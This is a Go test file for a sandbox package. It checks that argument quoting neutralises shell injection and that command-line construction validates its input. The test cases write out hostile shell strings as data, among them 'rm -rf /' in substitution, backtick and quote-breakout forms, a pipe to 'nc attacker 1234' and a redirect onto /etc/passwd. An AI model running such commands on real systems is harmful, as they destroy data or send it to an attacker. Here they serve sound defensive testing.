package sandbox

import (
	"strings"
	"testing"
)

// TestQuoteArgvNeutralisesShellSyntax is the security test for the whole
// provider surface: an argument is data, never shell syntax. If this test
// fails, untrusted task text or repository content could execute on a sandbox.
func TestQuoteArgvNeutralisesShellSyntax(t *testing.T) {
	t.Parallel()

	cases := []struct {
		name string
		arg  string
	}{
		{"command substitution", "$(rm -rf /)"},
		{"backticks", "`rm -rf /`"},
		{"semicolon", "hello; rm -rf /"},
		{"ampersand", "hello && rm -rf /"},
		{"pipe", "hello | nc attacker 1234"},
		{"redirect", "hello > /etc/passwd"},
		{"variable expansion", "$HOME"},
		{"glob", "*"},
		{"newline injection", "hello\nrm -rf /"},
		{"quote breakout", "'; rm -rf /; echo '"},
		{"double quote breakout", "\"; rm -rf /; echo \""},
		{"backslash", "a\\b"},
		{"empty", ""},
		{"unicode", "héllo wörld 🚀"},
	}

	for _, tc := range cases {
		tc := tc
		t.Run(tc.name, func(t *testing.T) {
			t.Parallel()
			line, err := QuoteArgv([]string{"echo", tc.arg})
			if err != nil {
				t.Fatalf("QuoteArgv returned error: %v", err)
			}
			// The escaped form must survive exactly one shell round-trip.
			words := shellSplit(t, line)
			if len(words) != 2 {
				t.Fatalf("expected 2 words after shell parsing, got %d: %q", len(words), words)
			}
			if words[0] != "echo" {
				t.Fatalf("program name changed: %q", words[0])
			}
			if words[1] != tc.arg {
				t.Fatalf("argument was altered by quoting:\n got %q\nwant %q", words[1], tc.arg)
			}
		})
	}
}

// shellSplit performs the POSIX single-quote decoding the shell would apply, so
// the test verifies the escaping rule rather than merely asserting a literal.
func shellSplit(t *testing.T, line string) []string {
	t.Helper()
	var (
		words   []string
		current strings.Builder
		inQuote bool
		started bool
	)
	runes := []rune(line)
	for i := 0; i < len(runes); i++ {
		r := runes[i]
		switch {
		case r == '\'':
			inQuote = !inQuote
			started = true
		case r == '\\' && !inQuote && i+1 < len(runes):
			i++
			current.WriteRune(runes[i])
			started = true
		case (r == ' ' || r == '\t') && !inQuote:
			if started {
				words = append(words, current.String())
				current.Reset()
				started = false
			}
		default:
			current.WriteRune(r)
			started = true
		}
	}
	if inQuote {
		t.Fatalf("unbalanced quotes in %q", line)
	}
	if started {
		words = append(words, current.String())
	}
	return words
}

func TestQuoteArgvRejectsEmptyInput(t *testing.T) {
	t.Parallel()
	if _, err := QuoteArgv(nil); err == nil {
		t.Fatal("expected an error for an empty argument vector")
	}
	if _, err := QuoteArgv([]string{"   "}); err == nil {
		t.Fatal("expected an error for a blank program name")
	}
}

func TestCommandLineStdinPath(t *testing.T) {
	t.Parallel()

	line, err := CommandLine(Command{
		Argv:      []string{"agent", "run"},
		StdinPath: "/workspace/.factory/prompt.txt",
	})
	if err != nil {
		t.Fatalf("CommandLine: %v", err)
	}
	if !strings.Contains(line, "< '/workspace/.factory/prompt.txt'") {
		t.Fatalf("expected a quoted stdin redirection, got %q", line)
	}

	// A relative stdin path is rejected: it would depend on the working
	// directory and is never needed.
	if _, err := CommandLine(Command{Argv: []string{"agent"}, StdinPath: "prompt.txt"}); err == nil {
		t.Fatal("expected an error for a relative StdinPath")
	}
}

func TestCommandLineRejectsAmbiguousCommand(t *testing.T) {
	t.Parallel()
	if _, err := CommandLine(Command{Argv: []string{"a"}, Script: "b"}); err == nil {
		t.Fatal("expected an error when both Argv and Script are set")
	}
	if _, err := CommandLine(Command{}); err == nil {
		t.Fatal("expected an error when neither Argv nor Script is set")
	}
}
